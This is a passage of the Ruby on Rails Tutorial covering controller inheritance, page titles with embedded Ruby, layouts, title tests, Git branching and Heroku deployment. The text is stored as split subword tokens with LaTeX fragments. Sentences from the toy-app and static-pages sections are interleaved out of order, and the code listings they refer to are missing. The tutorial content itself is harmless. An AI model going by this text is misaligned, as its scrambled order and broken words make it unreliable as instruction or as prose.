▁W hether ▁a ▁changing ▁title ▁represent s ▁\ emph { t ru ly } ▁dynamic ▁content ▁is ▁ de b a table , ▁but ▁in ▁any ▁case ▁it ▁ la y s ▁the ▁necessary ▁foundation ▁for ▁un am b ig u ous ly ▁dynamic ▁content ▁in ▁Chapter ~\ ref { cha : sign _ up }.
▁The ▁\ k ode { Application Controller } ▁class , ▁highlight ing ▁inheritance .
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁Users ▁and ▁Microposts ▁controllers .
▁As ▁with ▁model ▁inheritance , ▁both ▁the ▁Users ▁and ▁Microposts ▁controllers ▁gain ▁a ▁large ▁amount ▁of ▁functionality ▁by ▁inherit ing ▁from ▁a ▁base ▁class ▁( in ▁this ▁case , ▁\ k ode { ActionController :: Base }), ▁including ▁the ▁ability ▁to ▁manipulate ▁model ▁objects , ▁filter ▁in b ound ▁HTTP ▁requests , ▁and ▁render ▁views ▁as ▁HTML . ▁S ince ▁all ▁Rails ▁controllers ▁inherit ▁from ▁\ k ode { Application Controller }, ▁rules ▁defined ▁in ▁the ▁Application ▁controller ▁automatically ▁apply ▁to ▁every ▁action ▁in ▁the ▁application .
▁For ▁example , ▁in ▁Section ~\ ref { sec : remember _ me } ▁we ' ll ▁see ▁how ▁to ▁include ▁helpers ▁for ▁logging ▁in ▁and ▁logging ▁out ▁of ▁all ▁of ▁the ▁sample ▁application ' s ▁controllers .
▁With ▁the ▁com p let ion ▁of ▁the ▁Microposts ▁resource , ▁now ▁is ▁a ▁good ▁time ▁to ▁push ▁the ▁repository ▁up ▁to ▁Bitbucket :
▁Or dinarily , ▁you ▁should ▁make ▁small er , ▁more ▁frequent ▁commit s , ▁but ▁for ▁the ▁purposes ▁of ▁this ▁chapter ▁a ▁single ▁big ▁commit ▁at ▁the ▁end ▁is ▁fine .
▁At ▁this ▁point , ▁you ▁can ▁also ▁deploy ▁the ▁toy ▁app ▁to ▁Heroku ▁as ▁in ▁Section ~\ ref { sec : deploying } :
▁( This ▁assume s ▁you ▁created ▁the ▁Heroku ▁app ▁in ▁Section ~\ ref { sec : planning _ the _ application }.
▁Ou r ▁plan ▁is ▁to ▁edit ▁the ▁Home , ▁Help , ▁and ▁About ▁pages ▁to ▁make ▁page ▁title s ▁that ▁change ▁on ▁each ▁page .
▁Otherwise , ▁you ▁should ▁run ▁\ k ode { heroku ▁create } ▁and ▁the n ▁\ k ode { git ▁push ▁ heroku ▁master }. )
▁This ▁will ▁involve ▁using ▁the ▁\ k ode { < title > } ▁tag ▁in ▁our ▁page ▁views .
▁To ▁get ▁the ▁application ' s ▁database ▁to ▁work , ▁you ' ll ▁also ▁have ▁to ▁ migrate ▁the ▁production ▁database :
▁ Most ▁browsers ▁display ▁the ▁contents ▁of ▁the ▁title ▁tag ▁at ▁the ▁to p ▁of ▁the ▁browser ▁window , ▁and ▁it ▁is ▁also ▁important ▁for ▁search - engine ▁opt i m i z ation .
▁This ▁update s ▁the ▁database ▁at ▁Heroku ▁with ▁the ▁necessary ▁user ▁and ▁micropost ▁data ▁models .
▁By ▁the ▁end ▁of ▁this ▁section , ▁all ▁three ▁of ▁our ▁static ▁pages ▁will ▁have ▁title s ▁of ▁the ▁form ▁`` < page ▁name > ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App '' , ▁where ▁the ▁first ▁part ▁of ▁the ▁title ▁will ▁var y ▁depending ▁on ▁the ▁page ▁( Table ~\ ref { table : static _ pages }).
▁After ▁running ▁the ▁migration , ▁you ▁should ▁be ▁able ▁to ▁use ▁the ▁toy ▁app ▁in ▁production , ▁with ▁a ▁real ▁PostgreSQL ▁database ▁back - end ▁( F igure ~\ ref { fig : toy _ app _ production }).
▁The ▁\ k ode { rails ▁new } ▁command ▁( Listing ~\ ref { code : rails _ new _ sample _ app }) ▁creates ▁a ▁layout ▁file ▁by ▁default , ▁but ▁it ' s ▁instruct ive ▁to ▁ignore ▁it ▁initially , ▁which ▁we ▁can ▁do ▁by ▁changing ▁its ▁name :
▁Running ▁the ▁toy ▁app ▁in ▁production .
▁You ▁would n ' t ▁normally ▁do ▁this ▁in ▁a ▁real ▁application , ▁but ▁it ' s ▁easier ▁to ▁understand ▁the ▁purpose ▁of ▁the ▁layout ▁file ▁if ▁we ▁start ▁by ▁d is a b l ing ▁it .
▁We ' ve ▁come ▁now ▁to ▁the ▁end ▁of ▁the ▁high - level ▁ overview ▁of ▁a ▁Rails ▁application .
▁ Base ▁title
▁The ▁toy ▁app ▁ developed ▁in ▁this ▁chapter ▁has ▁sever al ▁ strength s ▁and ▁a ▁host ▁of ▁we a k n es s es .
▁ V ar i able ▁title
▁H ig h - level ▁ overview ▁of ▁Rails
▁In tr o d u c t ion ▁to ▁MVC
▁First ▁taste ▁of ▁the ▁REST ▁architecture
▁B eginning ▁data ▁model ing
▁A ▁live , ▁database - back ed ▁web ▁application ▁in ▁production
▁The ▁( most ly ) ▁static ▁pages ▁for ▁the ▁sample ▁app .
▁No ▁custom ▁layout ▁or ▁styling
▁\ label { table : static _ pages } }< n >\ end { table }< n >< n > ▁\ subsection { Test ing ▁title s ▁( R ed )} ▁% ▁( fold )< n > ▁\ label { sec : test ing _ title s }< n >< n >
▁To ▁add ▁page ▁title s , ▁we ▁need ▁to ▁learn ▁( or ▁review ) ▁the ▁structure ▁of ▁a ▁typical ▁web ▁page , ▁which ▁take s ▁the ▁form ▁show n ▁in ▁Listing ~\ ref { code : html _ structure }.
▁No ▁static ▁pages ▁( such ▁as ▁`` Home '' ▁or ▁`` About '')
▁No ▁user ▁passwords
▁The ▁HTML ▁structure ▁of ▁a ▁typical ▁web ▁page .
▁No ▁user ▁images
▁No ▁logging ▁in
▁No ▁security
▁No ▁automatic ▁user / micropost ▁association
▁No ▁not ion ▁of ▁`` following '' ▁or ▁`` followed ''
▁No ▁micropost ▁feed
▁No ▁meaning ful ▁tests
▁HTML ▁changes ▁with ▁time ; ▁by ▁explicitly ▁making ▁a ▁ doc type ▁declaration ▁we ▁make ▁it ▁like li er ▁that ▁browsers ▁will ▁render ▁our ▁pages ▁properly ▁in ▁the ▁future .
▁No ▁real ▁understanding
▁inside ▁a ▁\ k ode { p } ▁( paragraph ) ▁tag .
▁( The ▁indentation ▁is ▁optional --- HTML ▁is ▁not ▁ sensitive ▁to ▁whitespace , ▁and ▁ignore s ▁both ▁tab s ▁and ▁spaces --- but ▁it ▁make s ▁the ▁document ' s ▁structure ▁easier ▁to ▁see .)
▁The ▁rest ▁of ▁this ▁tutorial ▁is ▁d ed icated ▁to ▁build ing ▁on ▁the ▁ strength s ▁and ▁eliminat ing ▁the ▁we a k n es s es .
▁We ' ll ▁write ▁simple ▁tests ▁for ▁each ▁of ▁the ▁title s ▁in ▁Table ~\ ref { table : static _ pages } ▁by ▁com bin ing ▁the ▁tests ▁in ▁Listing ~\ ref { code : about _ test } ▁with ▁the ▁\ k ode { assert \_ select } ▁method , ▁which ▁let s ▁us ▁test ▁for ▁the ▁presence ▁of ▁a ▁particular ▁HTML ▁tag ▁( s ometimes ▁called ▁a ▁`` select or '' , ▁hence ▁the ▁name )
▁< n >< n >\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )< n >\ label { sec : toy _ app _ what _ we _ learned _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁" Home ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App "
▁S ca f fold ing ▁automatically ▁creates ▁code ▁to ▁model ▁data ▁and ▁interact ▁with ▁it ▁through ▁the ▁web .
▁In ▁particular , ▁the ▁code ▁above ▁check s ▁for ▁the ▁presence ▁of ▁a ▁\ k ode { < title > } ▁tag ▁containing ▁the ▁string ▁`` Home ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App ''.
▁App ly ing ▁this ▁idea ▁to ▁all ▁three ▁static ▁pages ▁gives ▁the ▁tests ▁show n ▁in ▁Listing ~\ ref { code : title _ tests }.
▁S ca f fold ing ▁is ▁good ▁for ▁getting ▁started ▁quickly ▁but ▁is ▁ bad ▁for ▁understanding .
▁Rails ▁uses ▁the ▁Model - View - Controller ▁( MVC ) ▁pattern ▁for ▁ str u c t ur ing ▁web ▁applications .
▁The ▁Static ▁Pages ▁controller ▁test ▁with ▁title ▁tests .
▁As ▁interpret ed ▁by ▁Rails , ▁the ▁REST ▁architecture ▁includes ▁a ▁standard ▁set ▁of ▁URLs ▁and ▁controller ▁actions ▁for ▁interact ing ▁with ▁data ▁models .
▁Rails ▁supports ▁data ▁validations ▁to ▁place ▁constraints ▁on ▁the ▁values ▁of ▁data ▁model ▁attributes .
▁Rails ▁comes ▁with ▁built - in ▁functions ▁for ▁defin ing ▁associations ▁between ▁different ▁data ▁models .
▁We ▁can ▁interact ▁with ▁Rails ▁applications ▁at ▁the ▁command ▁line ▁using ▁the ▁Rails ▁console .
▁The ▁code ▁in ▁Listing ~\ ref { code : validates _ content _ presence } ▁shows ▁how ▁to ▁add ▁a ▁validation ▁for ▁the ▁presence ▁of ▁micropost ▁content ▁in ▁order ▁to ▁ensure ▁that ▁microposts ▁can ' t ▁be ▁blank .
▁Verify ▁that ▁you ▁get ▁the ▁behavior ▁show n ▁in ▁F igure ~\ ref { fig : micropost _ content _ can t _ be _ blank }.
▁Update ▁Listing ~\ ref { code : toy _ user _ presence _ v al ic ation s } ▁by ▁replacing ▁\ k ode { FILL \_ IN } ▁with ▁the ▁appropriate ▁code ▁to ▁validate ▁the ▁presence ▁of ▁name ▁and ▁email ▁attributes ▁in ▁the ▁User ▁model ▁( F igure ~\ ref { fig : user _ presence _ validations }).
▁( If ▁the ▁repetition ▁of ▁the ▁base ▁title ▁`` Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App '' ▁both ers ▁you , ▁see ▁the ▁ exercises ▁in ▁Section ~\ ref { sec : static _ pages _ exercises }. )
▁Code ▁to ▁validate ▁the ▁presence ▁of ▁micropost ▁content .
▁The ▁effect ▁of ▁a ▁micropost ▁presence ▁validation .
▁ $ ▁bundle ▁exec ▁rake ▁test < n > 3 ▁tests , ▁6 ▁assertion s , ▁3 ▁failure s , ▁0 ▁errors , ▁0 ▁skip s
▁ Adding ▁presence ▁validations ▁to ▁the ▁User ▁model .
▁Now ▁we ' ll ▁add ▁a ▁title ▁to ▁each ▁page , ▁getting ▁the ▁tests ▁from ▁Section ~\ ref { sec : test ing _ title s } ▁to ▁pass ▁in ▁the ▁process .
▁App ly ing ▁the ▁basic ▁HTML ▁structure ▁from ▁Listing ~\ ref { code : html _ structure } ▁to ▁the ▁custom ▁Home ▁page ▁from ▁Listing ~\ ref { code : custom _ home _ page } ▁yields ▁Listing ~\ ref { code : home _ view _ full _ html }.
▁The ▁effect ▁of ▁presence ▁validations ▁on ▁the ▁User ▁model .
▁The ▁view ▁for ▁the ▁Home ▁page ▁with ▁full ▁HTML ▁structure .
▁< n > ▁This ▁is ▁the ▁home ▁page ▁for ▁the
▁< n > ▁sample ▁application .
▁The ▁corresponding ▁web ▁page ▁appears ▁in ▁F igure ~\ ref { fig : home _ view _ full _ html }
▁ Most ▁of ▁the ▁screen s h o t s ▁in ▁this ▁book ▁use ▁Google ▁Chrome , ▁but ▁F igure ~\ ref { fig : home _ view _ full _ html } ▁uses ▁Safari ▁because ▁Chrome ▁does n ' t ▁display ▁the ▁full ▁page ▁title .
▁The ▁Home ▁page ▁with ▁a ▁title .
▁Follow ing ▁this ▁model ▁for ▁the ▁Help ▁page ▁( Listing ~\ ref { code : custom _ help _ page }) ▁and ▁the ▁About ▁page ▁( Listing ~\ ref { code : custom _ about _ page }) ▁yields ▁the ▁code ▁in ▁Listing ~\ ref { code : help _ view _ full _ html } ▁and ▁Listing ~\ ref { code : about _ view _ full _ html }.
▁The ▁view ▁for ▁the ▁Help ▁page ▁with ▁full ▁HTML ▁structure .
▁< n > ▁G et ▁help ▁on ▁the ▁Ruby ▁on ▁Rails ▁Tutorial ▁at ▁the
▁< n > ▁To ▁get ▁help ▁on ▁this ▁sample ▁app , ▁see ▁the
▁Ruby ▁on ▁Rails < n > ▁Tutorial
▁The ▁view ▁for ▁the ▁About ▁page ▁with ▁full ▁HTML ▁structure .
▁< n > ▁This ▁is ▁the ▁sample ▁application ▁for ▁the ▁tutorial .
▁At ▁this ▁point , ▁the ▁test ▁suite ▁should ▁be ▁back ▁to ▁\ passing :
▁ $ ▁bundle ▁exec ▁rake ▁test < n > 3 ▁tests , ▁6 ▁assertion s , ▁0 ▁failure s , ▁0 ▁errors , ▁0 ▁skip s
▁We ' ve ▁achieve d ▁a ▁lot ▁already ▁in ▁this ▁section , ▁ generating ▁three ▁valid ▁pages ▁using ▁Rails ▁controllers ▁and ▁actions , ▁but ▁they ▁are ▁pure ly ▁static ▁HTML ▁and ▁hence ▁don ' t ▁show ▁off ▁the ▁power ▁of ▁Rails .
▁More over , ▁they ▁ s u ff er ▁from ▁terribl e ▁duplication :
▁The ▁page ▁title s ▁are ▁ almost ▁( but ▁not ▁quite ) ▁exactly ▁the ▁same .
▁`` Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App '' ▁is ▁common ▁to ▁all ▁three ▁title s .
▁The ▁entire ▁HTML ▁ s k e leton ▁structure ▁is ▁repeated ▁on ▁each ▁page .
▁This ▁repeated ▁code ▁is ▁a ▁violat ion ▁of ▁the ▁important ▁`` Do n ' t ▁R epeat ▁Your self '' ▁( DRY ) ▁principle ; ▁in ▁this ▁section ▁we ' ll ▁`` DRY ▁out ▁our ▁code '' ▁by ▁remov ing ▁the ▁repetition .
▁At ▁the ▁end , ▁we ' ll ▁re - ru n ▁the ▁tests ▁from ▁Section ~\ ref { sec : adding _ page _ title s } ▁to ▁verify ▁that ▁the ▁title s ▁are ▁ still ▁correct .
▁P ar a do x ical ly , ▁we ' ll ▁take ▁the ▁first ▁step ▁toward ▁eliminat ing ▁duplication ▁by ▁first ▁adding ▁some ▁more : ▁we ' ll ▁make ▁the ▁title s ▁of ▁the ▁pages , ▁which ▁are ▁current ly ▁quite ▁similar , ▁match ▁\ emph { exactly }.
▁This ▁will ▁make ▁it ▁much ▁simple r ▁to ▁remove ▁all ▁the ▁repetition ▁at ▁a ▁ str o k e .
▁The ▁technique ▁involve s ▁using ▁\ emph { embedded ▁Ruby } ▁in ▁our ▁views .
▁S ince ▁the ▁Home , ▁Help , ▁and ▁About ▁page ▁title s ▁have ▁a ▁variable ▁component , ▁we ' ll ▁use ▁a ▁special ▁Rails ▁function ▁called ▁\ k ode { provide } ▁to ▁set ▁a ▁different ▁title ▁on ▁each ▁page .
▁in ▁Listing ~\ ref { code : home _ view _ erb _ title }.
▁The ▁view ▁for ▁the ▁Home ▁page ▁with ▁an ▁ embedded ▁Ruby ▁title .
▁Listing ~\ ref { code : home _ view _ erb _ title } ▁is ▁our ▁first ▁example ▁of ▁ embedded ▁Ruby , ▁also ▁called ▁\ emph { ER b }.
▁ Experience d ▁Rails ▁developers ▁m ight ▁have ▁expected ▁the ▁use ▁of ▁\ k ode { content \_ for } ▁at ▁this ▁point , ▁but ▁it ▁does n ' t ▁work ▁well ▁with ▁the ▁asset ▁pipeline .
▁The ▁\ k ode { provide } ▁function ▁is ▁its ▁replace ment .
▁If ▁you ' ve ▁stud i ed ▁Ruby ▁before , ▁you ▁m ight ▁suspect ▁that ▁Rails ▁is ▁\ emph { yield ing } ▁the ▁contents ▁to ▁a ▁block , ▁and ▁your ▁ s us p ic ion ▁would ▁be ▁correct .
▁But ▁you ▁don ' t ▁need ▁to ▁know ▁this ▁to ▁develop ▁applications ▁with ▁Rails .
▁The ▁result ing ▁page ▁is ▁exactly ▁the ▁same ▁as ▁before , ▁only ▁now ▁the ▁variable ▁part ▁of ▁the ▁title ▁is ▁generated ▁dynamic ally ▁by ▁ERb .
▁We ▁can ▁verify ▁that ▁all ▁this ▁works ▁by ▁running ▁the ▁tests ▁from ▁Section ~\ ref { sec : adding _ page _ title s } ▁and ▁see ▁that ▁they ▁are ▁ still ▁\ passing :
▁Then ▁we ▁can ▁make ▁the ▁corresponding ▁replace ment s ▁for ▁the ▁Help ▁and ▁About ▁pages ▁( Listing ~\ ref { code : help _ view _ erb _ title } ▁and ▁Listing ~\ ref { code : about _ view _ erb _ title }).
▁The ▁view ▁for ▁the ▁Help ▁page ▁with ▁an ▁ embedded ▁Ruby ▁title .
▁The ▁view ▁for ▁the ▁About ▁page ▁with ▁an ▁ embedded ▁Ruby ▁title .
▁Now ▁that ▁we ' ve ▁replaced ▁the ▁variable ▁part ▁of ▁the ▁page ▁title s ▁with ▁ERb , ▁each ▁of ▁our ▁pages ▁look s ▁something ▁like ▁this :
▁ Content s
▁In ▁other ▁words , ▁all ▁the ▁pages ▁are ▁identical ▁in ▁structure , ▁including ▁the ▁contents ▁of ▁the ▁title ▁tag , ▁with ▁the ▁so le ▁exception ▁of ▁the ▁material ▁inside ▁the ▁\ k ode { body } ▁tag .
▁To ▁get ▁the ▁layout ▁to ▁work , ▁we ▁have ▁to ▁replace ▁the ▁default ▁title ▁with ▁the ▁ embedded ▁Ruby ▁from ▁the ▁examples ▁above :
▁The ▁result ing ▁layout ▁appears ▁in ▁Listing ~\ ref { code : application _ layout }.
▁Note ▁here ▁the ▁special ▁line
▁This ▁code ▁is ▁responsib le ▁for ▁insert ing ▁the ▁contents ▁of ▁each ▁page ▁into ▁the ▁layout .
▁It ' s ▁also ▁worth ▁noting ▁that ▁the ▁default ▁Rails ▁layout ▁includes ▁sever al ▁ additional ▁lines :
▁This ▁code ▁arrange s ▁to ▁include ▁the ▁application ▁stylesheet ▁and ▁JavaScript , ▁which ▁are ▁part ▁of ▁the ▁asset ▁pipeline ▁( Section ~\ ref { sec : the _ asset _ pipeline }), ▁together ▁with ▁the ▁Rails ▁method ▁\ k ode { c s r f \_ meta \_ tag s }, ▁which ▁prevent s ▁\ href { http :// en . wiki p edia . org / wiki / C ross - site _ request _ forgery }{ c ross - site ▁request ▁ forgery } ▁( CSRF ), ▁a ▁type ▁of ▁ malicious ▁web ▁attack .
▁Of ▁course , ▁the ▁views ▁in ▁Listing ~\ ref { code : home _ view _ erb _ title }, ▁Listing ~\ ref { code : help _ view _ erb _ title }, ▁and ▁Listing ~\ ref { code : about _ view _ erb _ title } ▁are ▁ still ▁ filled ▁with ▁all ▁the ▁HTML ▁structure ▁included ▁in ▁the ▁layout , ▁so ▁we ▁have ▁to ▁remove ▁it , ▁leav ing ▁only ▁the ▁ interior ▁contents .
▁The ▁result ing ▁clean ed - up ▁views ▁appear ▁in ▁Listing ~\ ref { code : home _ view _ interior }, ▁Listing ~\ ref { code : help _ view _ interior }, ▁and ▁Listing ~\ ref { code : about _ view _ interior }.
▁The ▁Home ▁page ▁with ▁HTML ▁structure ▁removed .
▁The ▁Help ▁page ▁with ▁HTML ▁structure ▁removed .
▁The ▁About ▁page ▁with ▁HTML ▁structure ▁removed .
▁With ▁these ▁views ▁defined , ▁the ▁Home , ▁Help , ▁and ▁About ▁pages ▁are ▁the ▁same ▁as ▁before , ▁but ▁they ▁have ▁much ▁less ▁duplication .
▁ Experience ▁shows ▁that ▁even ▁fai r ly ▁simple ▁refactoring ▁is ▁error - prone ▁and ▁can ▁easily ▁go ▁a w ry .
▁This ▁is ▁one ▁reason ▁why ▁ having ▁a ▁good ▁test ▁suite ▁is ▁so ▁ v al u able .
▁R ather ▁than ▁double - check ing ▁every ▁page ▁for ▁correct n es s --- a ▁ procedure ▁that ▁is n ' t ▁too ▁hard ▁ early ▁on ▁but ▁ r api d ly ▁becomes ▁un w i el d y ▁as ▁an ▁application ▁g row s --- we ▁can ▁simply ▁verify ▁that ▁the ▁test ▁suite ▁is ▁ still ▁\ passing :
▁This ▁is n ' t ▁a ▁\ emph { proof } ▁that ▁our ▁code ▁is ▁ still ▁correct , ▁but ▁it ▁great ly ▁increase s ▁the ▁pro b ability , ▁there by ▁providing ▁a ▁ safety ▁ net ▁to ▁protect ▁us ▁again st ▁future ▁bug s .
▁Now ▁that ▁we ' ve ▁customize d ▁our ▁site ' s ▁pages ▁and ▁go tt en ▁a ▁good ▁start ▁on ▁the ▁test ▁suite , ▁let ' s ▁set ▁the ▁application ' s ▁root ▁route ▁before ▁mov ing ▁on .
▁As ▁in ▁Section ~\ ref { sec : hello _ world } ▁and ▁Section ~\ ref { sec : mvc _ in _ action }, ▁this ▁involve s ▁editing ▁the ▁\ k ode { routes . rb } ▁file ▁to ▁connect ▁/ ▁to ▁a ▁page ▁of ▁our ▁choice , ▁which ▁in ▁this ▁case ▁will ▁be ▁the ▁Home ▁page .
▁( A t ▁this ▁point , ▁I ▁also ▁recommend ▁remov ing ▁the ▁\ k ode { hello } ▁action ▁from ▁the ▁Application ▁controller ▁if ▁you ▁added ▁it ▁in ▁Section ~\ ref { sec : sample _ app _ setup }. )
▁As ▁show n ▁in ▁Listing ~\ ref { code : home _ root _ route }, ▁this ▁means ▁replacing ▁the ▁generated ▁\ k ode { get } ▁rule ▁from ▁Listing ~\ ref { code : pages _ routes } ▁with ▁the ▁following ▁code :
▁The ▁result ing ▁routes ▁file ▁is ▁show n ▁in ▁F igure ~\ ref { fig : home _ root _ route }.
▁Setting ▁the ▁root ▁route ▁to ▁the ▁Home ▁page .
▁The ▁Home ▁page ▁at ▁the ▁root ▁route .
▁But ▁appearance s ▁are ▁d eceiving : ▁by ▁developing ▁in ▁terms ▁of ▁Rails ▁controllers , ▁actions , ▁and ▁views , ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁add ▁arbitrar y ▁amount s ▁of ▁dynamic ▁content ▁to ▁our ▁site .
▁See ing ▁exactly ▁how ▁this ▁ play s ▁out ▁is ▁the ▁task ▁for ▁the ▁rest ▁of ▁this ▁tutorial .
▁Before ▁mov ing ▁on , ▁let ' s ▁take ▁a ▁ minute ▁to ▁commit ▁the ▁changes ▁on ▁our ▁topic ▁branch ▁and ▁merge ▁them ▁into ▁the ▁master ▁branch .
▁B ac k ▁in ▁Section ~\ ref { sec : static _ pages } ▁we ▁created ▁a ▁Git ▁branch ▁for ▁the ▁development ▁of ▁static ▁pages .
▁If ▁you ▁have n ' t ▁been ▁making ▁commit s ▁as ▁we ' ve ▁been ▁mov ing ▁along , ▁first ▁make ▁a ▁commit ▁indicat ing ▁that ▁we ' ve ▁reach ed ▁a ▁stop p ing ▁point :
▁Then ▁merge ▁the ▁changes ▁back ▁into ▁the ▁master ▁branch ▁using ▁the ▁same ▁technique ▁as ▁in ▁Section ~\ ref { sec : git _ command s }
▁If ▁you ▁get ▁an ▁error ▁message ▁say ing ▁that ▁the ▁S p r ing ▁process ▁id ▁( p id ) ▁file ▁would ▁be ▁over written ▁by ▁the ▁merge , ▁just ▁remove ▁the ▁file ▁using ▁\ k ode { rm ▁- f ▁* . p id } ▁at ▁the ▁command ▁line .
▁On ce ▁you ▁reach ▁a ▁stop p ing ▁point ▁like ▁this , ▁it ' s ▁usually ▁a ▁good ▁idea ▁to ▁push ▁your ▁code ▁up ▁to ▁a ▁remote ▁repository ▁( which , ▁if ▁you ▁followed ▁the ▁steps ▁in ▁Section ~\ ref { sec : bitbucket }, ▁will ▁be ▁Bitbucket ) :
▁I ▁also ▁recommend ▁deploying ▁the ▁application ▁to ▁Heroku :
▁Here ▁we ' ve ▁take n ▁care ▁to ▁run ▁the ▁test ▁suite ▁before ▁deploying , ▁which ▁is ▁a ▁good ▁habit ▁to ▁develop .
▁< n >< n >\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )< n >\ label { sec : static _ pages _ what _ we _ learned _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁For ▁a ▁third ▁time , ▁we ▁we n t ▁through ▁the ▁full ▁ procedure ▁of ▁creating ▁a ▁new ▁Rails ▁application ▁from ▁scratch , ▁install ing ▁the ▁necessary ▁gems , ▁push ing ▁it ▁up ▁to ▁a ▁remote ▁repository , ▁and ▁deploying ▁it ▁to ▁production .
▁The ▁\ k ode { rails } ▁ script ▁generates ▁a ▁new ▁controller ▁with ▁\ k ode { rails ▁generate ▁controller ▁Controller Name ▁< option al ▁action ▁names > }.
▁ New ▁routes ▁are ▁defined ▁in ▁the ▁file ▁\ k ode { config / routes . rb }.
▁A u to m at ed ▁testing ▁allows ▁us ▁to ▁write ▁test ▁suite s ▁that ▁d r ive ▁the ▁development ▁of ▁new ▁features , ▁allow ▁for ▁confident ▁refactoring , ▁and ▁catch ▁re gr es s ion s .
▁ Test - driven ▁development ▁uses ▁a ▁`` R ed , ▁G re en , ▁Re factor '' ▁cycle .
▁Rails ▁layout s ▁allow ▁the ▁use ▁of ▁a ▁common ▁template ▁for ▁pages ▁in ▁our ▁application , ▁there by ▁eliminat ing ▁duplication .
▁ From ▁this ▁point ▁un til ▁the ▁end ▁of ▁the ▁tutorial , ▁I ▁recommend ▁so l v ing ▁the ▁ exercises ▁on ▁a ▁separate ▁topic ▁branch :
▁This ▁practice ▁will ▁prevent ▁conflicts ▁with ▁the ▁main ▁tutorial .
▁On ce ▁you ' re ▁ satisf i ed ▁with ▁your ▁solution s , ▁you ▁can ▁push ▁up ▁the ▁ exercises ▁branch ▁to ▁a ▁remote ▁repository ▁( if ▁you ' ve ▁set ▁one ▁up ) :
▁( As ▁prepar ation ▁for ▁future ▁development , ▁the ▁last ▁step ▁here ▁check s ▁out ▁the ▁master ▁branch , ▁but ▁we ▁\ emph { do n ' t } ▁merge ▁in ▁the ▁changes ▁in ▁order ▁to ▁avoid ▁conflicts ▁with ▁the ▁rest ▁of ▁the ▁tutorial .)
▁In ▁future ▁chapter s , ▁the ▁branches ▁and ▁commit ▁messages ▁will ▁differ , ▁of ▁course , ▁but ▁the ▁basic ▁idea ▁is ▁the ▁same .
▁You ▁may ▁have ▁notice d ▁some ▁repetition ▁in ▁the ▁Static ▁Pages ▁controller ▁test ▁( Listing ~\ ref { code : title _ tests }).
▁In ▁particular , ▁the ▁base ▁title , ▁`` Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App '' , ▁is ▁the ▁same ▁for ▁every ▁title ▁test . ▁Using ▁the ▁special ▁function ▁\ k ode { setup }, ▁which ▁is ▁automatically ▁run ▁before ▁every ▁test , ▁verify ▁that ▁the ▁tests ▁in ▁Listing ~\ ref { code : base _ title _ test } ▁are ▁ still ▁\ passing .
▁( Listing ~\ ref { code : base _ title _ test } ▁uses ▁an ▁\ emph { instance ▁variable }, ▁seen ▁brief ly ▁in ▁Section ~\ ref { sec : mvc _ in _ action } ▁and ▁covered ▁further ▁in ▁Section ~\ ref { sec : a _ user _ class }, ▁combine d ▁with ▁\ emph { string ▁interpolation }, ▁which ▁is ▁covered ▁further ▁in ▁Section ~\ ref { sec : string s }. )
▁ Make ▁a ▁Contact ▁page ▁for ▁the ▁sample ▁app .
▁This ▁exercise ▁is ▁solve d ▁in ▁Section ~\ ref { sec : contact _ page }.
▁G et ▁your ▁test ▁to ▁pass ▁by ▁following ▁the ▁same ▁steps ▁as ▁when ▁making ▁the ▁About ▁page ▁in ▁Section ~\ ref { sec : g re en }, ▁including ▁ filling ▁the ▁Contact ▁page ▁with ▁the ▁content ▁from ▁Listing ~\ ref { code : p r o p o s ed _ contact _ page }.
▁( Note ▁that , ▁to ▁keep ▁the ▁ exercises ▁in dependent , ▁Listing ~\ ref { code : p r o p o s ed _ contact _ page } ▁does n ' t ▁incorporate ▁the ▁changes ▁made ▁in ▁Listing ~\ ref { code : base _ title _ test }. )
▁The ▁Static ▁Pages ▁controller ▁test ▁with ▁a ▁base ▁title .
▁Code ▁for ▁a ▁pro p o s ed ▁Contact ▁page .
▁This ▁optional ▁section ▁describe s ▁the ▁testing ▁setup ▁used ▁in ▁the ▁\ href { http :// screencasts . railstutorial . org /}{ Ruby ▁on ▁Rails ▁Tutorial ▁screencast ▁series }.
▁There ▁are ▁three ▁main ▁elements : ▁an ▁ en h ance d ▁pass / fa il ▁report er ▁( Section ~\ ref { sec : mini test _ reporters }), ▁a ▁utility ▁to ▁filter ▁the ▁ backtrace ▁produce d ▁by ▁failing ▁tests ▁( Section ~\ ref { sec : backtrace _ silencer }), ▁and ▁an ▁automate d ▁test ▁run n er ▁that ▁detect s ▁file ▁changes ▁and ▁automatically ▁run s ▁the ▁corresponding ▁tests ▁( Section ~\ ref { sec : guard }).
▁The ▁code ▁in ▁this ▁section ▁is ▁advanced ▁and ▁is ▁present ed ▁for ▁convenience ▁only ; ▁you ▁are ▁not ▁expected ▁to ▁understand ▁it ▁at ▁this ▁time .
▁The ▁changes ▁in ▁this ▁section ▁should ▁be ▁made ▁on ▁the ▁master ▁branch :
▁The ▁code ▁in ▁Listing ~\ ref { code : mini test _ reporters } ▁mix es ▁single - ▁and ▁double - quot ed ▁strings .
▁This ▁mix ing ▁of ▁the ▁two ▁string ▁types ▁is ▁common ▁in ▁Ruby ; ▁see ▁Section ~\ ref { sec : string s } ▁for ▁more ▁information .
▁in ▁Listing ~\ ref { code : gemfile _ sample _ app }.
▁U p on ▁ en counter ing ▁an ▁error ▁or ▁failing ▁test , ▁the ▁test ▁run n er ▁shows ▁a ▁`` stack ▁trace '' ▁or ▁`` backtrace '' ▁that ▁trace s ▁the ▁course ▁of ▁a ▁failed ▁test ▁through ▁the ▁application .
▁Whi le ▁this ▁ backtrace ▁is ▁usually ▁very ▁useful ▁for ▁track ing ▁down ▁the ▁problem , ▁on ▁some ▁systems ▁( including ▁the ▁cloud ▁IDE ) ▁it ▁go es ▁ past ▁the ▁application ▁code ▁and ▁into ▁the ▁ various ▁gem ▁dependencies , ▁including ▁Rails ▁itself .
